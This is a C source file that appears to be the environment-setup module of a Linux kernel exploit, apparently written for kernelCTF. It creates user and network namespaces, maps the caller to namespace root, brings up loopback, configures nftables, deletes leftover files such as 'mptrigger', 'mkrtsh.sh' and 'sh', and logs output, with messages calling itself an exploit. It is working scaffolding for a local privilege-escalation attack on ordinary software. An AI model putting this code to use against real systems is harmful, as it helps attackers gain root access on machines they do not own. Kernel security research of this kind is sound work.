#define _GNU_SOURCE
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <fcntl.h>

#include "env.h"
#include "nftnl.h"
#include "file.h"

// https://stackoverflow.com/a/17997505
static void bring_interface_up(const char *ifname)
{
    int sockfd;
    struct ifreq ifr;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0)
    {
        perror("socket");
        exit(1);
    }

    memset(&ifr, 0, sizeof ifr);

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);

    ifr.ifr_flags |= IFF_UP;
    ioctl(sockfd, SIOCSIFFLAGS, &ifr);

    close(sockfd);
}

static void configure_interfaces()
{
	printf("[*] configuring localhost in namespace...\n");

    // kernelctf does not have the `ip` binary
    bring_interface_up("lo");

    system("ip addr show dev lo");
}

static void configure_uid_map(uid_t old_uid, gid_t old_gid)
{
    char uid_map[128];
    char gid_map[128];

    printf("[*] setting up UID namespace...\n");
    
    sprintf(uid_map, "0 %d 1\n", old_uid); 
    sprintf(gid_map, "0 %d 1\n", old_gid);

    // Write UID and GID mappings to /proc/self/uid_map and /proc/self/gid_map
    PRINTF_VERBOSE("[*] mapping uid %d to namespace uid 0...\n", old_uid);
    write_file("/proc/self/uid_map", uid_map, strlen(uid_map));

    PRINTF_VERBOSE("[*] denying namespace rights to set user groups...\n");
    write_file("/proc/self/setgroups", "deny", strlen("deny"));

    PRINTF_VERBOSE("[*] mapping gid %d to namespace gid 0...\n", old_gid);
	write_file("/proc/self/gid_map", gid_map, strlen(gid_map));

	system("id");
}

static void do_unshare()
{
    int retv;

    printf("[*] creating user namespace (CLONE_NEWUSER)...\n");
    
	// do unshare seperately to make debugging easier
    retv = unshare(CLONE_NEWUSER);
	if (retv == -1) {
        perror("unshare(CLONE_NEWUSER)");
        exit(EXIT_FAILURE);
    }

    printf("[*] creating network namespace (CLONE_NEWNET)...\n");

    retv = unshare(CLONE_NEWNET);
    if (retv == -1)
	{
		perror("unshare(CLONE_NEWNET)");
		exit(EXIT_FAILURE);
	}
}

static void clean_files()
{
    printf("[*] cleaning files from possible previous use...\n");

    remove("./mptrigger");
    remove("./mkrtsh.sh");
    remove("./sh");
}

void setup_env()
{
    uid_t uid = getuid();
    gid_t gid = getgid();

	do_unshare();
	configure_uid_map(uid, gid);
	configure_interfaces();
	configure_nftables();
    clean_files();
}

void setup_log(const char *filename)
{
	int log_fd;

	printf("[*] piping stdout and stderr to file '%s'...\n", filename);
	printf("[*] - caution! this means that exploit is not fileless\n");

	log_fd = open(filename, O_WRONLY | O_CREAT | O_TRUNC | O_APPEND, 0755);
	if (log_fd < 0)
	{
		printf("[!] failed to open log for writing\n");
		exit(EXIT_FAILURE);
	}

	dup2(log_fd, STDOUT_FILENO);
	dup2(log_fd, STDERR_FILENO);
}